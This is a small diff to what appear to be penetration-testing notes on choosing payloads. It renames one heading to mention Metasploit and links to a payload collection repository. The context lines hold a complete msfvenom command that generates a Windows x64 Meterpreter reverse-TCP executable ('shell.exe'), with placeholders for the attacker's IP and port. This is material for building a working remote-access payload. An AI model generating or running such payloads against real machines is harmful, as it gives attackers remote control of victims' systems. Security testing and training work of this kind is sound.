@@ -2,7 +2,7 @@ This section goes over the best payloads to use.
 
 https://github.com/xephora/PayloadsAllTheThings
 
-[Generating Payloads on Windows]
+[Generating Payloads on Windows using Metasploit]
 
 [Regular Reverse TCP]
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe > shell.exe
